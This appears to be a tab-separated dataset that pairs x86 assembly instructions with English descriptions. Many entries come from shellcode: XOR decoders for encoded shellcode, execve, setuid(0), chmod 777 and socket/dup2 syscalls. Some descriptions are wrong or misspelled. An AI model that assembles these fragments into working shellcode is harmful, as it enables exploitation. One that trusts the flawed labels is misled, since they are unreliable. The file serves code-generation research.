xor [ecx + 116], dh	perform xor operation between the value stored at the location ecx+116 and dh
xor [ecx + 116], dh	perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116]
xor [ecx], bh	perform the xor operation between the value stored at the location ecx and bh
xor [ecx], dh	perform the xor operation between the value stored at the location ecx and dh
xor ah, ah	zero out ah register
xor ah, ah	clear the ah register
xor al, 0e9h	xoring al content with 0xe9
xor al, 0e9h	perform a logical xor between the al register and 0e9h and save the result in al
xor al, 0x30	run xor operation between the value 48 and al register contents
xor al, 0x30	run xor operation between al regsiter and the hexadeciaml value 0x30
xor al, 0x30	perform the xor operation between the al register and the value 0x30
xor al, 0x41	perform the xor operation between the al register and the value 0x41
xor al, 0x4a	perform the xor operation between the al register and the value 0x4a
xor al, 0x4a \n xor al, 0x41	run xor operation between al regsiter and the hexadecimal values 0x4a and 0x41
xor al, bl	xoring al register with bl register
xor al, bl \n jz short shellcode	perform xor between al and bl and jump short to shellcode if the result is zero
xor al,0x12	xoring hexadecimal value 0x12 with al register
xor ax, 0x3041	perform the xor operation between the ax register and the value 0x3041
xor ax, 0x4f73	perform the xor operation between the ax register and the value 0x4f73
xor ax, 0x4f73 \n xor ax, 0x3041	run xor operation between ax register and 20339 value then between the same register and 12353 value
xor ax, 0x539	xor encoded_shellcode with 1337, one word at a time
xor ax, 0x539	perform a xor operation between ax and 0x539 and save the result in ax
xor ax, 0x539	perform xor between ax and 0x539 and store the result in ax
xor ax, 0x539 \n jz decoded_shellcode	jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
xor ax, 0x7777	run xor operation between ax regsiter and the hexadeciaml value 0x7777
xor ax, 0x7777	perform the xor operation between the contents of the ax register and the value 0x7777
xor ax, ax	clear the ax register
xor ax, ax	zero out ax register
xor ax, bx	perform a logical xor between the bx register and the ax register and save the result in ax
xor ax, bx	perform xor between ax and bx
xor ax, bx \n jz call_decoded	xoring bx and ax register and if the result is 0 go to call_decoder
xor ax, bx \n jz call_decoded	jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero
xor ax, bx \n jz call_decoded	perform xor between ax and bx and jump to call decoded if the result is zero
xor bh, byte [esi + edx]	perform the xor between bh and the byte in esi+edx
xor bl, 0xaa \n jne encodedshellcode	perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero
xor bl, 0xbb	perform a logical xor between the bl register and 0xbb and save the result in bl
xor bl, 0xbb	zero out bl register
xor bl, 0xBB \n jz encoded	jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bl, 0xbb \n jz encoded	perform xor between bl and 0xbb and jump to encoded if the result is zero
xor bl, 0xBB \n jz formatting	jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bl, 0xbb \n jz formatting \n mov cl, byte [esi]	perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl
xor bl, byte [esi + edx]	perform the xor between bl and the byte in esi+edx
xor bl, dl \n jz short shellcode	perform xor between bl and dl and jump short to shellcode if the result is not zero
xor bl,0x90	xoring bl with hexadeimal value 0x90
xor bl,0xaa	xoring hexadecimal value 0xaa wih bl register
xor bx, bx	initialize bx to 0
xor bx, bx	clear the bx register
xor bx,bx	zero out bx register
xor byte [edi], 0xdd	xoring the 0xdd value that represent the xor operation with the contents of the memory adddress edi
xor byte [esi + ecx - 1], 0x3	xoring 0x3 with esi +ecx-1 content
xor byte [esi + ecx - 1], 0x3	perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]
xor byte [esi], 0x2c	run a xor operation between 0x2c and the first character pointed from esi
xor byte [esi], 0x2c	perform the xor operation between the byte starting at the addess in esi and the value 0x2c
xor byte [esi], 0x88	xor between the current byte in esi and 0x88
xor byte [esi], 0x97	xor between current byte in esi and 0x97
xor byte [esi], cl	xoring cl content with the byte contained into esi register
xor byte [esi], cl	perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
xor byte [esi], cl	perform a xor operation between a byte in esi and cl
xor byte [esi], dl	perform the xor between the current byte of the shellcode and the dl register
xor byte [esi], dl	perform the xor between the byte in esi and dl
xor byte [esi], dl	perform the xor between the current byte in esi and dl
xor byte [esi+1], dl	perform the xor between the next byte of the shellcode and the dl register
xor byte [esi+ecx],0x0f	perform the xor operation between the byte at memory location esi+ecx and 0x0f
xor byte ptr [edi],al	xoring al register with the byte contained into the space memory at the adress edi
xor byte ptr [esi],0xaa	xoring hexadecimal value 0xaa with the byste at the adress esi
xor ch, byte [esi + edx]	perform the xor between ch and the byte in esi+edx
xor cl, 0x32	perform the xor operation between cl and 0x32 and store the resut in cl
xor cl, 0x32 \n je short encodedshellcode	perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero
xor cl, 0x32 \n jz short EncodedShellcode	jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
xor cl, 0xaa	perform a logical xor between the cl register and 0xaa and save the result in cl
xor cl, 0xaa	perform the xor operation between cl and 0xaa and store the result in cl
xor cl, 0xAA \n jnz Next_Cycle	jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
xor cl, 0xaa \n jnz next_cycle	perform xor between cl and 0xaa and jump to next_cycle if the result is not zero
xor cl, 0XAA \n jz shift_decode	jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero
xor cl, 0xaa \n jz shift_decode	perform xor between cl and 0xaa and jump to shift decode if the result is zero
xor cl, byte [esi + edx]	perform the xor between cl and the byte in esi+edx
xor dl, 0xbb	perform a logical xor between the dl register and 0xbb and save the result in dl
xor dl, 0xbb	perform the xor operation between dl and 0xbb and store the result in dl
xor dl, 0xBB \n jz Next_Cycle	jump to the Next_Cycle label if the result of the logical xor between the dl register and the value 0xBB is zero
xor dl, 0xbb \n jz next_cycle	perform xor between dl and 0xbb and jump to next_cycle if the result is zero
xor eax, [edi]	perform the xor operation between eax register and edi register and store the result in eax
xor eax, [esi]	perform xor operation between eax register and esi register and store the result in eax
xor eax, 0x58494741	perform the xor operation between eax and 0x58494741 value and store the result in eax
xor eax, 0x58494741	perform a logical xor between the eax register and 0x58494741 and save the result in eax
xor eax, 0x6e696230	run xor operation between ax regsiter and the hexadeciaml value 0x6e696230
xor eax, 0x6e696230	perform the xor operation between the eax register and the value 0x6e696230
xor eax, 0x7575	perform a logical xor operation between eax and 0x7575
xor eax, 0xffffffff	xoring hexadecimal value 0xffffffff with eax register
xor eax, 0xffffffff	perform a logical xor between the eax register and 0xffffffff and save the result in eax
xor eax, ea \n push eax	zero out eax register and push its contents on the stack
xor eax, eax	zero out ecx register
xor eax, eax	clear eax
xor eax, eax	zero out eax
xor eax, eax	reseting eax register
xor eax, eax	zero out eax register
xor eax, eax	zero-ing eax
xor eax, eax	clear eax register
xor eax, eax	0's our eax
xor eax, eax	0's out eax
xor eax, eax	initialize eax with decimal value 0
xor eax, eax	perform xor operation between eax and eax
xor eax, eax	reset both lower and uppper bytes of eax to be 0
xor eax, eax	reset eax
xor eax, eax	set the eax register to null
xor eax, eax	zero out the eax register
xor eax, eax	init eax 0
xor eax, eax	clear the eax register
xor eax, eax	set eax to 0
xor eax, eax \n cmp edx, eax \n je l3	zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register
xor eax, eax \n cmp edx, eax \n jne l3	zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register
xor eax, eax \n inc al \n int 0x80	clear eax and execute exit syscall
xor eax, eax \n mov al, [esi+1]	clean the eax register and move the next byte of the shellcode into the lower byte of the register
xor eax, eax \n mov al, [esi+1]	clear the eax register and move the next byte of the shellcode into the lower byte of the register
xor eax, eax \n mov al, 0x1	clear the eax register and move 0x1 in the lowest byte of the register
xor eax, eax \n mov al, 0x1 \n int 0x80	clear eax register the load exit syscall number in it and call kernel
xor eax, eax \n mov al, 0x3	zero out eax and move 0x3 in the lowest byte of the register
xor eax, eax \n mov al, 0x3f	clear eax and save in it the number of syscall dup2
xor eax, eax \n mov al, 0x4	clear eax and move 0x4 in the lowest byte of the register
xor eax, eax \n mov al, 0xb \n int 0x80	clear eax and execute execve syscall
xor eax, eax \n mov al, 0xf \n int 0x80	execute __nr_chmod syscall
xor eax, eax \n mov al, 2	clear the eax register and move 2 in the lowest byte of the register
xor eax, eax \n mov al, 22	clear the eax register and move 22 into the lower byte of the register
xor eax, eax \n mov al, 5	clear eax and put the number of syscall open in it
xor eax, eax \n mov al, 5	clean the eax register and move 5 in the lowest byte of the register
xor eax, eax \n mov al, 6	clear eax and copy the numebr of the syscall close in its last byte
xor eax, eax \n mov al,0x1 \n int 0x80	execute __nr_exit syscall
xor eax, eax \n mov ebx, eax \n mov ecx, eax \n mov edx, eax	zero out eax, ebx, ecx and edx registers
xor eax, eax \n push eax	zero out eax register and push its contents on the stack stack
xor eax, eax \n push eax	clear eax register and push its contents on the stack
xor eax, eax \n push eax	zero out eax register and insert it on the stack
xor eax, eax \n push eax	clear eax and push it on the stack
xor eax, eax \n push eax	put null bytes in the stack
xor eax, eax \n push eax	clear eax register and push ita content on the stack
xor eax, eax \n push eax	clear eax and push its content on the stack
xor eax, eax \n push eax	clear aex and push its content on the stack
xor eax, eax \n push eax	push null into the stack
xor eax, eax \n push eax	zero out eax register and push it on stack
xor eax, eax \n push eax	push zero onto the stack
xor eax, eax \n push eax	zero out the eax register and push zero onto the stack
xor eax, eax \n push eax	clear the eax register and push its contents onto the stack
xor eax, eax \n xor ebx, ebx	zero out eax and ebx registers
xor eax, eax \n xor ebx, ebx	clear eax and ebx registers
xor eax, eax \n xor ebx, ebx	clear eax and ebx register
xor eax, eax \n xor ebx, ebx	cleaning eax and ebx registers
xor eax, eax \n xor ebx, ebx	zero out eax and ebx registers using xor operation
xor eax, eax \n xor ebx, ebx	0's our eax and ebx
xor eax, eax \n xor ebx, ebx	0's out eax and ebx
xor eax, eax \n xor ebx, ebx	zero out eax adn ebx registers
xor eax, eax \n xor ebx, ebx	zero out eax and ebx
xor eax, eax \n xor ebx, ebx	clean eax and ebx registers
xor eax, eax \n xor ebx, ebx	clear the eax and the ebx registers
xor eax, eax \n xor ebx, ebx	clear eax and ebx
xor eax, eax \n xor ebx, ebx \n cdq	clear eax, ebx and edx registers
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx	zero out eax, ebx, ecx
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx	zero out eax,ebx and ecx registers
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx	clear eax, ebx and ecx
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx	zero out eax, ebx and ecx
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	clearing the eax, ebx, ecx, edx registers
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	zero out eax, ebx, ecx and edx register
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	zero out eax,ebx, ecx and edx registers
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	zero out eax, ebx, ecx and edx
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	clear eax, ebx, ecx and edx registers
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	clean eax, ebx, ecx and edx
xor eax, eax \n xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	zero out eax, ebx, ecx and edx registers
xor eax, eax \n xor ebx, ebx \n xor edx, edx	clear eax, ebx and edx
xor eax, eax \n xor ebx, ebx \n xor edx, edx \n xor edi, edi	cleaning eax, ebx, edx and edi registers
xor eax, eax \n xor ecx, ecx	clear eax and ecx
xor eax, eax \n xor ecx, ecx	zero out eax and ecx register
xor eax, eax \n xor ecx, ecx	0's out eax and ecx register
xor eax, eax \n xor edx, edx	clear eax and edx
xor eax, eax \n xor edx, edx	zeroing eax and edx reisters
xor eax, eax \n xor edx, edx	zero out eax and edx registers
xor eax, eax \n xor edx, edx	zero out eax and edx register
xor eax, eax \n xor esi, esi	zero out eax and esi registers
xor eax, eax \npush eax	clear eax and push it on the stack
xor eax, eax,	clear eax
xor eax, ebx	perform a logical xor between the eax register and the ebx register and save the result in eax
xor eax, ebx	perform xor operation between eax register and ebx register and store the result in eax
xor eax, edi	perform a logical xor between the eax register and the edi register and save the result in eax
xor eax, esi	perform a logical xor between the eax register and the esi register and save the result in eax
xor eax,eax	clear eax
xor eax,eax	zero out eax register
xor eax,eax	zero out eaz
xor eax,eax	zero out eax
xor eax,eax	clear eax register
xor eax,eax	initiliaze eax to 0
xor eax,eax	zero out eax regsiter
xor eax,eax \n mov al,0x2 \n int 0x80	clear eax and load the code of syscall fork in it, then call kernel
xor eax,eax \n mov al,0x2 \n int 0x80	clear eax then execute dork syscall
xor eax,eax \n mov al,0x7 \n int 0x80	clear eax and load the codeof syscall waitpid in it and then call kernel
xor eax,eax \n mov al,1 \n int 80h	clear eax, then execute exit syscall
xor eax,eax \n push eax	clear eax and push it on the stack
xor eax,eax \n xor ebx,ebx	clear eax and ebx registers
xor eax,eax \n xor ebx,ebx	zero out eax and ebx register
xor eax,eax \n xor ecx,ecx	zero out eax and ecx register
xor eax,eax \n xor edx,edx	zeroing eax and edx registers
xor eax,ebx	xoring eax with ebx
xor ebp, ebp	clear ebp register
xor ebp, ebp	zero the value on ebp
xor ebx, ebp	perform a logical xor between the ebx register and the ebp register and save the result in ebx
xor ebx, ebx	clear ebx
xor ebx, ebx	xoring ebx
xor ebx, ebx	zero out ebx register
xor ebx, ebx	zero out ebx
xor ebx, ebx	clear ebx, setuid(0)
xor ebx, ebx	clear ebx, setgid(0)
xor ebx, ebx	0's out ebx
xor ebx, ebx	clear ebx register
xor ebx, ebx	initialize ebx with 0
xor ebx, ebx	reset both lower and uppper bytes of ebx to be 0
xor ebx, ebx	clear the ebx register
xor ebx, ebx	init ebx 0
xor ebx, ebx	reset ebx to 0
xor ebx, ebx	set the ebx register to null
xor ebx, ebx	zero out the ebx register
xor ebx, ebx \n cmp eax, ebx \n je exit	zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
xor ebx, ebx \n cmp eax, ebx \n jne exit	zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register
xor ebx, ebx \n mov bl, [esi+1]	zero out the ebx register and move the next byte of the shellcode into the lower byte of the register
xor ebx, ebx \n mov bl, [esi+1]	clean the ebx register and move the next byte of the shellcode into the lower byte of the register
xor ebx, ebx \n mov bl, [esi+1]	clear the ebx register and move the next byte of the shellcode into the lower byte of the register
xor ebx, ebx \n mov bl, 0x3	set ebx to the old socket fd = 3
xor ebx, ebx \n mov bl, 0x3	zero out ebx and move 0x3 in the lowest byte of the register
xor ebx, ebx \n mov bl, 0x4	clear ebx and move 0x4 in the lowest byte of the register
xor ebx, ebx \n mov bl, 2	clear the ebx register and move 2 in the lowest byte of the register
xor ebx, ebx \n mov bl, 5	clean the ebx register and move 5 in the lowest byte of the register
xor ebx, ebx \n mov ebx, eax	clear ebx and copy the eax contents in it
xor ebx, ebx \n mul ebx	zero out ebx and eax
xor ebx, ebx \n mul ebx	zero out ebx, eax and edx
xor ebx, ebx \n mul ebx	zero out the eax and ebx register
xor ebx, ebx \n mul ebx	zero out the eax register and the ebx register
xor ebx, ebx \n mul ebx	clear ecx and eax
xor ebx, ebx \n mul ebx	zero out ecx, edx and eax
xor ebx, ebx \n mul ebx	clean eax and edx
xor ebx, ebx \n mul ebx	zero out eax and edx
xor ebx, ebx \n pop ebx	clear ebx and pop it from the stack
xor ebx, ebx \n push dword ebx	clear ebx register and put its content as a double word on stack
xor ebx, ebx \n push ebx	zero out the ebx register and push zero onto the stack
xor ebx, ebx \n push ebx	push zero onto the stack
xor ebx, ebx \n push ebx	clear the ebx register and push its contents onto the stack
xor ebx, ebx \n xor ecx, ecx	zro out ebx and ecx register
xor ebx, ebx \n xor ecx, ecx	clean ebx and ecx
xor ebx, ebx \n xor ecx, ecx \n mul ecx	clear ebx, ecx and eax regsiters
xor ebx, ebx \n xor ecx, ecx \n xor edx, edx	clear ebx, ecx, edx
xor ebx, ebx \n xor edx, edx	clear the ebx and edx registers
xor ebx, ebx \n xor edx, edx	zero out ebx and edx
xor ebx, word __flag_byte	perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
xor ebx,eax	xoring ebx with eax
xor ebx,ebx	clear ebx
xor ebx,ebx	zero out ebx register
xor ebx,ebx	cler ebx
xor ebx,ebx	clear ebx regsiter
xor ebx,ebx	zero out ebx
xor ebx,ebx	clear ebx register
xor ebx,ebx \n mul ebx	put zero into ebx and eax
xor ebx,ebx \n xor eax,eax	clear ebx and eax register
xor ecx, bh	perform a logical xor between the ecx register and the bh register and save the result in ecx
xor ecx, dh	perform a logical xor between the ecx register and the dh register and save the result in ecx
xor ecx, ecx	zero out ecx register
xor ecx, ecx	clear ecx
xor ecx, ecx	cleat ecx
xor ecx, ecx	xoring ecx
xor ecx, ecx	clear ecx register
xor ecx, ecx	zero out ecx
xor ecx, ecx	define o_rdonly, ecx = 0
xor ecx, ecx	null ecx
xor ecx, ecx	zeroing ecx register
xor ecx, ecx	xor to clear out ecx
xor ecx, ecx	clean ecx
xor ecx, ecx	zero out loop counter ecx
xor ecx, ecx	initialize ecx to zero
xor ecx, ecx	initialize ecx with decimal value 0
xor ecx, ecx	reset both lower and uppper bytes of ecx to be 0
xor ecx, ecx	set the ecx register to null
xor ecx, ecx	zero out the ecx register
xor ecx, ecx	reset ecx to 0
xor ecx, ecx	clear the ecx register
xor ecx, ecx \n cmp ebx, ecx \n je l1	zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
xor ecx, ecx \n cmp ebx, ecx \n jne l1	zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register
xor ecx, ecx \n mov cl, [esi+1]	clean the ecx register and move the next byte of the shellcode into the lower byte of the register
xor ecx, ecx \n mov cl, [esi+1]	clear the ecx register and move the next byte of the shellcode into the lower byte of the register
xor ecx, ecx \n mov cl, [esi+1]	zero out the ecx register and move the next byte of the shellcode into the lower byte of the register
xor ecx, ecx \n mov cl, 0x19	zero out the ecx register and move 0x19 into the lower byte of the register
xor ecx, ecx \n mov cl, 0x1e	clear the counter and move 0x1e into the first byte of the register
xor ecx, ecx \n mov cl, 0x3	init new socket fd
xor ecx, ecx \n mov cl, 0x3	clear ecx and save the number of loops, 3, in it
xor ecx, ecx \n mov cl, 0x3	zero out ecx and move 0x3 in the lowest byte of the register
xor ecx, ecx \n mov cl, 0x4	clear ecx and move 0x4 in the lowest byte of the register
xor ecx, ecx \n mov cl, 2	clear the ecx register and move 2 in the lowest byte of the register
xor ecx, ecx \n mov cl, 23	zero out the ecx register and move 23 into the lower byte of the register
xor ecx, ecx \n mov cl, 25	zero out the ecx register and move 25 in the lower 8 bits of the register
xor ecx, ecx \n mov cl, 3	clear ecx and move the value 3 in it
xor ecx, ecx \n mov cl, 5	clean the ecx register and move 5 in the lowest byte of the register
xor ecx, ecx \n mov cl, shellcode_length	zero out the loop counter and move shellcode_length in the first byte
xor ecx, ecx \n mov cx, 0x1ff	clear ecx and move the value 0777 in it ( set file permissions to 777 so anyone can do anything (read, write, or execute))
xor ecx, ecx \n mov cx, 0x1ff	clear ecx and set file permissions to 777
xor ecx, ecx \n mul ecx	zero out ecx and eax register
xor ecx, ecx \n mul ecx	zero out eax ecx register
xor ecx, ecx \n mul ecx	zero out ecx and eax registers
xor ecx, ecx \n mul ecx	clear ecx and eax register
xor ecx, ecx \n mul ecx	clear eax and ebx registers
xor ecx, ecx \n mul ecx	trick to clear eax and ecx
xor ecx, ecx \n mul ecx	zero out eax and ecx
xor ecx, ecx \n mul ecx	zero out the eax register and the ecx register
xor ecx, ecx \n mul ecx	cause both eax and edx to become zero
xor ecx, ecx \n mul ecx	zero out eax and edx registers
xor ecx, ecx \n mul ecx	clear ecx and eax
xor ecx, ecx \n mul ecx	zero out ecx, edx and eax
xor ecx, ecx \n mul ecx	clean eax and edx
xor ecx, ecx \n mul ecx	zero out eax and edx
xor ecx, ecx \n push ecx	push zero onto the stack
xor ecx, ecx \n push ecx	clear the ecx register and push its contents onto the stack
xor ecx, ecx \n push ecx	zero out the ecx register and push zero onto the stack
xor ecx, ecx \n xor eax, eax	zero out ecx and eax register
xor ecx, ecx \n xor eax, eax	zero out ecx and eax
xor ecx, ecx \n xor eax, eax \n xor edx, edx	clear ecx, eax and edx
xor ecx, ecx \n xor ebx, ebx \n xor eax, eax	clear ecx, ebx and eax
xor ecx, ecx \n xor edx, edx	zero out ecx and edx register
xor ecx,ecx	zero out ecx register
xor ecx,ecx	clear ecx
xor ecx,ecx	zero out ecx
xor ecx,ecx \n mul ecx	clear ecx and eax
xor ecx,ecx \n mul ecx	clear ecx and eax register
xor ecx,ecx \n mul ecx	clear ecx and eax registers
xor ecx,ecx \n mul ecx	clear eax and ebx registers
xor ecx,ecx \n xor eax, eax	clear eax and ecx registers
xor edi, ebp	xoring ebp with edi register
xor edi, edi	zero out edi register
xor edi, edi	initialize edi with 0
xor edi, edi	clear the edi register
xor edi, edi	init edi 0
xor edi, edi \n xor eax, eax \n xor ebx, ebx \n xor edx, edx	zero out the edi, eax, ebx and edx registers
xor edx, ecx \n mov dl, [esi+1]	clean the edx register and move the next byte of the shellcode into the lower byte of the register
xor edx, ecx \n mov dl, [esi+1]	clear the edx register and move the next byte of the shellcode into the lower byte of the register
xor edx, ecx \n mov dl, [esi+1]	zero out the edx register and move the next byte of the shellcode into the lower byte of the register
xor edx, edx	clear edx
xor edx, edx	clear edx register
xor edx, edx	zero out edx register
xor edx, edx	zero out edx
xor edx, edx	zero out edx register using xor operation
xor edx, edx	initialize edx with the decimal value 0
xor edx, edx	initialize edx with the hexadecimal value 0x0
xor edx, edx	clear the edx register
xor edx, edx	set the contents of edx to zero
xor edx, edx	set the edx register to null
xor edx, edx	zero out the edx register
xor edx, edx	reset edx to 0
xor edx, edx \n cmp ecx, edx \n je l2	zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register
xor edx, edx \n cmp ecx, edx \n jne l2	zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register
xor edx, edx \n mov dl, [esi]	clear the edx register and move the current byte of the shellcode into the lowest byte of the register
xor edx, edx \n mov dl, 0x3	zero out edx and move 0x3 in the lowest byte of the register
xor edx, edx \n mov dl, 0x4	clear edx and move 0x4 in the lowest byte of the register
xor edx, edx \n mov dl, 2	clear the edx register and move 2 in the lowest byte of the register
xor edx, edx \n mov dl, 5	clean the edx register and move 5 in the lowest byte of the register
xor edx, edx \n mul edx	zero out eax and edx
xor edx, edx \n mul edx	zero out the eax and edx register
xor edx, edx \n push edx	clear edx and push it on the stack
xor edx, edx \n push edx	push null into stack
xor edx, edx \n push edx	zero out edx register then push its content on stack
xor edx, edx \n push edx	zero out the edx register and push zero onto the stack
xor edx, edx \n push edx	push zero onto the stack
xor edx, edx \n push edx	clear the edx register and push its contents onto the stack
xor edx, edx \n push edx \n push 0x01 \n push 0x02 \n mov ecx, esp	zero out edx register and save af_inet, sock_stream and edx contents in ecx
xor edx, edx \n xor ecx, ecx	clear edx and ecx reegsiter
xor edx, edx \n xor esi, esi	zero out edx and esi register
xor edx,edx	clear edx
xor edx,edx	clear edx register
xor edx,edx	zero out edx
xor edx,edx	zero out edx register
xor edx,edx \n mul edx	clear edx and eaz registers
xor edx,edx \n push edx	clear edx adn push null terminating string on stack
xor esi, esi	zero out esi register
xor esi, esi	zero out esi content
xor esi, esi	clean esi
xor esi, esi	initialize the esi register with the decimal value 0
xor esi, esi	init the esi register to 0
xor esi, esi	clear the esi register
xor rdx, rdx \n push rdx	zero out rdx and push it on stack
xor zero_reg, zero_reg	clear zero_reg
xor zero_reg, zero_reg	zero out zero_reg
xor_decode:	define xor_decode_label
xordecode:	declare _xordecode label
xordecode:	define xordecode
y dd 3000	declare a doubleword at address y initialized to contain 3000
y: dd 0x0	create the doubleword variable y in memory and initialize it to zero
ymmval: resw 1	reserve one word for ymmval
z dd 1, 2, 3	declare three doubleword values initialized to 1 2 and 3 at address z
z dd 1,2,3	declare three doublewords of memory starting at address z and initialized to 1 2 and 3
z: dd 0x0	create the doubleword variable z in memory and initialize it to zero
zero10:	define _zeero10 label
zero11:	define _zero11 label
zero12:	define _zero12 label
zero13:	define _zero13 label
zero14:	define _zero14 label
zero15:	define _zero15 label
zero16:	define _zero16 label
zero17:	define _zero17 label
zero18:	define _zero18 label
zero19:	define _zero19 label
zero1a:	define _zero1a label
zero1b:	define _zero1b label
zero1c:	define _zero1c label
zero1d:	define _zero1d label
zero1e:	define _zero1e label
zero2:	define _zero2 label
zero3:	define _zero3 label
zero4:	define _zero4 label
zero5:	define _zero 5 label
zero6:	define _zero6 label
zero7:	define _zero7 label
zero8:	define _zero8 label
zero9:	define _zero9 label
zeroa:	define _zeroa label
zerob:	define _zerob label
zeroc:	define _zeroc label
zerod:	define _zerod label
zeroe:	define _zeroe label
zerof:	define _zerof label